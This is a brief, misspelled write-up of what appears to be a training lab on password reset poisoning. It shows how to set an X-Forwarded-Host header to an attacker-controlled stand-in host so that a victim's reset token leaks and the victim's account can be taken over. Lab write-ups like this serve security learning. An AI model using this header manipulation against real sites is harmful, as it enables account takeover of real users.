# Password reset poisoning via middleware

This lab requires middleware in orded to actually get the reset password cookie from carlos

# Method

How this lab works is you need to access the cookie from carlos' reset password. In order to do that what we do is manipulat the password reset http request to have carlos' name and also a header called "x-forwarded-host"

    X-Forwared-Host: "exploit.example"

This will allow the forgot password cookie to be sent to our email logs. Then, all we do is access his reset password screen using that unique cookie and we have access to carlos' account!
